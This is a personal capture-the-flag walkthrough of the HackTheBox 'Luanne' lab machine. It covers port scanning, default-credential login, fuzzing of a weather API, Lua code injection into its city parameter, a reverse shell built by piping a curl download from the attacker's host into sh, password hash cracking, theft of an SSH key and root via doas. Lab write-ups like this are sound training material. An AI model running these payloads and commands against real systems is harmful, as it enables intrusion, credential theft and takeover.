# HackTheBox Notes for Luanne Box.
----------------------------------

## Notes
--------
1. scan the network with a minimum rate for packets sent, which is way faster, note that, although this is fast,
    it may miss some ports!
    - `nmap --min-rate 10000 <ip-address>`
    at the same time we run the usual `nmap` and also for all the ports with `-p-` switch also:
    - `nmap -sC -sV -oA nmap/luanne-targeted 10.10.10.218`
    - `sudo nmap -p- 10.10.10.218 -oA nmap/luanne-allports`

2. We go to the ip address of `10.10.10.218` with the browser, we get asked for a user and password, no default passwords work.
    and if we escape password authentication, we get a 401 Unauthorized, which has a `127.0.0.1:3000`, From this forwarding we figure 
    that this is not just a simple html web application, it's doing something to forward it, we can get it from nmap results, but it's 
    too early for nmap to finish. we try the `10.10.10.218:3000`, we see unable to coneect, so the port is not listening. 

3. To get the server type quickly we use the curl as follow and we see that it's an `nginx` serevr:
    - `curl -v 10.10.10.218` 

4. An odd behaviour, `/` asks for authentication, but any other paths on the server does not, e.g. `10.10.10.218/index.html`

5. When nmap finished, we see that 9001 is alos an open port, `Medusa httpd 1.12 (Supervisor process manager)`. Also the system 
    is a NetBSD. If we try the 9001 port we see that it's a different unauthorized page, when we skip the auth, hence it should 
    point to different application, probably.

6. We google for the default user and password of the service, supervisor, we reach at, user, 123 defaults, we try these on the 9001
    port. It's successful! We see the supervisor output. 

7. We fire up the meta sploits:
    - `sudo msfdb run`
    we search for the supervisor, in the meta sploit shell, and select it:
    - `search supervisor`
    - `use 2`
    we note that, since it's till 2017, we may get discouraged, also we can show the version of the exploit and on which versions 
    it can work:
    - `show options`
    - `show targets`
    we see that it's from version 3.0 to 3.3, while our superviosr version is 4.2, so it will probably not work, nevertheless we try it.
    we see `LHOST` to `tun0` which it our ip, which can also be displayed with `ip a`, and we set the remote host ip, `RHOST` to the 
    ip of the machine, 10.10.10.218:
    - `set LHOST tun0` 
    - `set RHOST 10.10.10.218`
    we also set the http user and password:
    - `set HttpUsername user`
    - `set HttpPassword 123`
    since our payload is set for a linux one, we search for BSD one, we try a bunch like reverse tcp:
    - `set payload payload/bsd/x64/shell_reverse_tcp`
    - `run`
    we try others also, but we fail! it should not be suprising since we suspected from frist that it's not a compatible version of supervisor.

8.  As meta sploits yields no success, we look around the processes in supervisord. From processes we see that `httpd` runs weather api 
    through port 3000. If we curl the weather we will see a 404 not found.
    - `curl 10.10.10.218/weather/`

9. As `robots.txt` says it stills harvesting for cities, though it returns 404, we run the `/weather/` through a fuzzy word list, namely `ffuf`, fast web fuzzer,
    as security lists is not installed by default on kali, we first install it:
    - `sudo apt install seclists`
    fuzzing `/weather/` endpoint:
    - `ffuf -u http://10.10.10.218/weather/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`
    we get one, `forecast`.

10. If we curl the forecast we see that it says no city list is specified, use `city=list`:
    - `curl 10.10.10.218/weather/forecast`
    if we specify the list itself we get the list of all cities which there is a forecast:
    - `curl 10.10.10.218/weathe/forecast?city=list`
    and if we specify London for example insteas of list itself we get the forecast for the city itself.

11. We search for special chars instead of city name itself, as special cases can make these api's fail in an unexpected way:
    - `ffuf -u http://10.10.10.218/weather/forecast?city=FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt`
    the only special character that returns a 200 is `%` sign.

12. We take a look to the output of the fuzzer which matches the return codes of 200 and 500:
    - `ffuf -u http://10.10.10.218/weather/forecast?city=FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt -mc 200,500`
    if we take a look to the output we can guess that we probably need characters with words greater than 5 (since % has words 
    greater than 5) and lines that are greater than 5:
    - `ffuf -u http://10.10.10.218/weather/forecast?city=FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt -mc 200,500 -fw 5`
    we get 3: `% + '`
    
14. If we try single quote we get a Lua, nil value error:
    - `curl 10.10.10.218/weather/forecast?city=\'`    

15. Now we try to inject the url with lua, we try some stuff with single quote, then we fuzz the url with a single quote:
    - `ffuf -u http://10.10.10.218/weather/forecast?city=\'FUZZ-- -w /usr/share/seclists/Fuzzing/special-chars.txt -mc 200,500`
    we try to get the one that is different, so by looking to the output we filter for `-fw 9`, then we get `)`, closing paranthesis 
    as a special character with different behaviour. 
    
16. Now with this we inject the url like this, note that from beforehand we fired up the burpsuit and we have sent the initial request 
    to the repeater, and we change the city to the following value:
    - `city=')+os.execute("id")--`    
    now we get the user and group id.

17. Now we try to get a reverse shell. We get a reverse shell oneliner for BSD NetCat. We listen on port 9001:
    - `nc -lvnp 9001`  
    we also open a local server to see if we get an appropriate response from the machine:
    - `python3 -m http.server`
    we set the city in the burp suit to:
    - `city=')+os.execute("curl+10.10.16.6:8000/shell.sh|+sh")--`
    the python server is to see if the above injection sends a response to the client.
    we get a reverse shell on the nc!
    Note that curl is receiving the `shell.sh` script from port 8000 and python server is set up where the script is. We serve the file
    with http server on the local machine, the remote machine receives the file and pipes it to `sh`. On the otherhand we listen to port
    9001 with `nc` on the local machine, since the final resonse of the machine is from port 9001.

18. There is no bash on the machine. When we look around we see a `.htpasswd`, when we cat it, we see a `webapi_user` and probably a 
    hashed password. we try to crack it. We use the `john` to crack the hash, which is a tool for simple passwords cracking:
    - `john pw --wordlist=/usr/share/wordlists/rockyou.txt`
    pw is the `user:password` file.
    We try to shh with the user and password, but the user/pass login ssh is blocked.

19. We do a `netstat` to search for other listening ports:
    - `netstat -an | grep -i list`
    we find that 3001 is also another listening port.

20. We search for processes that make use of the port, 3001:
    - `ps -auxw | grep 3001`
    we see one httpd process that is being run by the user `r.michaels`.
    we see if we can do a `su` with this user and previously found password from `john`:
    - `su - r.michaels`
    we fail!

21. By looking at the processes with `ps auwx | grep 3001` that are run on port 3001, we see that another server is run by the user `r.michaels` 
    on this port. We try to curl the localhost on this port the home directory of the user:
    - `curl --user webapi_user:iamthebest localhost:3001/~r.michaels/`
    we get a ftp like repsonse that is one link pointing to parent directory and one **id_rsa**, we can now curl that:
    - `curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa`
    with this saving to a file and chmoding to 600, now we can ssh to the machine with this user and can a nice reverse shell.

22. We look around a little bit, udner `ls -la devel/www/` we see the `.htpasswd` file, by catting it, it's same one as we got before.
    by further looking around we see a .enc file, probably it's a gnu encrypted file. As there are the key rings in the home directory
    we may be able to decrypt it:
    - `netpgp --decrypt /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc --output=/tmp/backup.tar.gz`
    - `tar xvzf /tmp/backup.tar.gz` 

23. In the decrypred directory, inside the www directory we see a `.htpasswd` file, by catting it we see that it's a different one from the 
    previous one, by using `john` we get a `littlebear` password by the user `webapi_user`, but by doing a sudo in BSD, we get that it's the 
    root password!:
    - `doas whoami`
    we get root!
    Now we do a shell using sudo:
    - `doas sh`
    and voilla!
